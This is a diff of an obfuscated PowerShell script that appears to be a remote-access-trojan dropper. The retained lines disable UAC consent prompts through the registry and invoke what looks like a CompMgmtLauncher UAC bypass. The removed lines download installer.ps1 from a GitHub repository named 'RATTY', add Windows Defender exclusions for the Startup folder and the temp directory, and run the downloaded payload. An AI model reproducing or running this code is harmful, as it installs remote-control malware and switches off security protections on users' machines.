@@ -39,24 +39,8 @@ workflow gXJqIeQLEx{
 			snCAvSgLOW mscfile CompMgmtLauncher.exe $nGZbQUSuHF
 		}
 	}
-	$eMEbXSRHpU=Get-Location
-
-
-
-	# write-Host "Current working directory remove-item -fo  $curdir"
-	$mWjZRdpvnM=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-	$QEXcMiaOoG=$mWjZRdpvnM.split("\")
-	$lYIbKdtBmp=$QEXcMiaOoG[1]
-
 	Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 00000000
-	Restart-Computer -Wait
-	"bGnQSfviwu.cmd"|cmd
-	Install-Module -Name PSWindowUpdate -Force
-	Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/installer.ps1" -OutFile "qjhOmDleBS.ps1"
-	Add-MpPreference -ExclusionPath "C:/Users/$lYIbKdtBmp/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/qjhOmDleBS.ps1"
-	Add-MpPreference -ExclusionPath "$env:temp"
-	powershell .\qjhOmDleBS.ps1
-}
+
 gXJqIeQLEx 'cmd.exe'
 
 # disable UACMOM
